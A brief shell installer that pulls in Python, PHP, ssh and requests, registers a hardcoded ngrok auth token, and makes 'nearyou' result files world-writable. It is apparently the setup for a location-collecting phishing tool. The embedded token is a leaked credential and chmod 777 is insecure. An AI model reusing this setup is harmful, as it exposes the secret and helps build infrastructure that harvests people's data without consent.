echo '[!] Updating...'
apt-get update > install.log
echo
echo '[!] Installing Dependencies...'
echo '    Python3'
apt-get -y install python3 python3-pip &>> install.log
echo '    PHP'
apt-get -y install php &>> install.log
echo '    ssh'
apt-get -y install ssh &>> install.log
echo '    Requests'
pip3 install requests &>> install.log
echo
echo '[!] Setting Ngrok...'
cd template/ngrok/ && ./ngrok authtoken 1aTlQLoWAjKZr5R0Llcc34jhFvH_2sbUJMaVpTPWmdgsEyUNV &>> install.log
echo
echo '[!] Setting Permissions...'
chmod 777 template/nearyou/php/info.txt. &>> install.log
chmod 777 template/nearyou/php/result.txt  &>> install.log
echo
echo '[!] Installed.'
